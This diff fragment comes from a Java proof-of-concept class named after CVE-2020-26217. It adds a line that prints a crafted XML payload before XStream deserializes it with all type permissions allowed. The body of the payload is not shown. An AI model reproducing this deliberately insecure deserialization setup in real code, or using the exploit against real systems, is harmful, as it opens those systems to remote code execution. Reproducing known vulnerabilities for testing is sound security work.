@@ -161,6 +161,7 @@ public class CVE_2020_26217 {
                 "  </entry>\n" +
                 "</map>";
 
+        System.out.println(xml);
         XStream xstream = new XStream();
         xstream.addPermission(AnyTypePermission.ANY);
         xstream.fromXML(xml);
